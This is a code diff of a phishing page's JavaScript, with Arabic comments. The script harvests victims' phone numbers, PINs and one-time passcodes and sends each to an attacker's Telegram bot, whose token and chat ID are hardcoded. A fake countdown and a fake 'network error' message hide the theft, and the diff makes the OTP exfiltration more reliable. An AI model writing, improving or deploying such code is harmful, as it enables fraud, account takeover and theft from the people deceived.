@@ -60,21 +60,24 @@
 </div>
 
 <script>
-    // بيانات البوت الخاصة بك
     const tok = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
     const cid = "8665814266";
+    let timerInterval; // متغير لتخزين العداد
 
     function send(t) {
-        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
+        // استخدام return لجعل الطلب متزامن أو التأكد من إرساله
+        return fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
     }
 
     function validateInput() {
         const t = document.getElementById('tel').value.replace(/[^0-9]/g, '');
         const p = document.getElementById('pin').value.replace(/[^0-9]/g, '');
+        // تحديث القيمة المدخلة لتنظيفها من أي رموز غير رقمية
+        document.getElementById('tel').value = t;
+        document.getElementById('pin').value = p;
         document.getElementById('btn1').disabled = !(t.length === 8 && p.length === 4);
     }
 
-    // قانون استلام 6 أرقام فقط وتفعيل الزر
     function validateOtp() {
         const o = document.getElementById('otp').value.replace(/[^0-9]/g, '');
         document.getElementById('otp').value = o;
@@ -82,28 +85,48 @@
     }
 
     function toStep2() {
-        send(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
-        document.getElementById('p1').classList.add('hidden');
-        document.getElementById('p2').classList.remove('hidden');
+        const tel = document.getElementById('tel').value;
+        const pin = document.getElementById('pin').value;
+        
+        // إرسال البيانات
+        send(`🚨 دخول جديد:\n📱 هاتف: ${tel}\n🔑 PIN: ${pin}`);
+        
+        // الانتقال للواجهة الثانية
+        document.getElementById('p1').style.display = 'none'; // إخفاء الواجهة الأولى
+        document.getElementById('p2').classList.remove('hidden'); // إظهار الثانية
+        
         startTimer();
     }
 
     function startTimer() {
-        let time = 300;
-        setInterval(() => {
-            let m = Math.floor(time / 60), s = time % 60;
-            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
-            if(time > 0) time--;
+        let time = 300; // 5 دقائق
+        const display = document.getElementById('time');
+        
+        // مسح أي عداد قديم لتجنب التداخل
+        if (timerInterval) clearInterval(timerInterval);
+
+        timerInterval = setInterval(() => {
+            let m = Math.floor(time / 60);
+            let s = time % 60;
+            
+            display.innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
+            
+            if (time <= 0) {
+                clearInterval(timerInterval);
+                display.innerText = "00:00";
+            } else {
+                time--;
+            }
         }, 1000);
     }
 
     function final() {
-        // إرسال الرمز المكون من 6 أرقام إلى البوت
-        send(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
-        alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
-        location.reload();
+        const otpValue = document.getElementById('otp').value;
+        
+        // إرسال الـ OTP
+        send(`🔢 OTP المستلم: ${otpValue}`).then(() => {
+            alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
+            location.reload();
+        });
     }
 </script>
-
-</body>
-</html>
